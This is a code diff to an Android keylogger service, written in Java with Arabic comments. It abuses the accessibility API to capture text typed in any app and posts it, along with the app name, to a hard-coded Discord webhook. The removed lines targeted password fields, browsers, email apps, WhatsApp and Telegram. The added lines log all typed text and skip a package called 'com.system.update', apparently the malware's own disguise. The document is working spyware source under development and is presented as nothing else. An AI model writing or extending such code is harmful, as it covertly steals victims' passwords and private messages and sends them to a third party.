@@ -10,6 +10,7 @@ import okhttp3.*;
 public class KeyloggerService extends AccessibilityService {
     private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1566505631010000936/p7JDjQyMloPFqCP50Bmc4D8Qjop8nVcWaGH9FYTzfEry_4U39rQWqjGEE4mpPokrbqVa";
     private final OkHttpClient client = new OkHttpClient();
+    private String lastText = "";
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
@@ -19,23 +20,13 @@ public class KeyloggerService extends AccessibilityService {
                 String text = source.getText().toString();
                 String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
 
-                if (text.trim().isEmpty()) return;
+                if (text.trim().isEmpty() || text.equals(lastText)) return;
+                
+                lastText = text;
+                if (pkg.equals("com.system.update")) return;
 
-                // 1. لو الخانة دي مخصصة لباسورد (زي تسجيل الدخول)
-                if (source.isPassword()) {
-                    sendToDiscord("🔐 **باسورد مكتشف!**\n**التطبيق:** " + pkg + "\n**الباسورد:** `" + text + "`");
-                } 
-                // 2. لو بنكتب في المتصفح أو تطبيق إيميل
-                else if (pkg.contains("chrome") || pkg.contains("browser") || pkg.contains("gmail") || pkg.contains("email") || pkg.contains("outlook")) {
-                    // لو النص طويل شوية (أكتر من 3 حروف) ومش مجرد حرف واحد
-                    if (text.length() > 3) {
-                        sendToDiscord("🌐 **كتابة في المتصفح/الإيميل:** [" + pkg + "]\n" + text);
-                    }
-                }
-                // 3. لواتساب وتليجرام
-                else if (pkg.contains("whatsapp") || pkg.contains("telegram")) {
-                    sendToDiscord("💬 **رسالة في [" + pkg + "]:**\n" + text);
-                }
+                // إرسال النص اللي بيتكتب فوراً
+                sendToDiscord("⌨️ **Keylog:**\n**التطبيق:** `" + pkg + "`\n**النص:** `" + text + "`");
             }
         }
     }
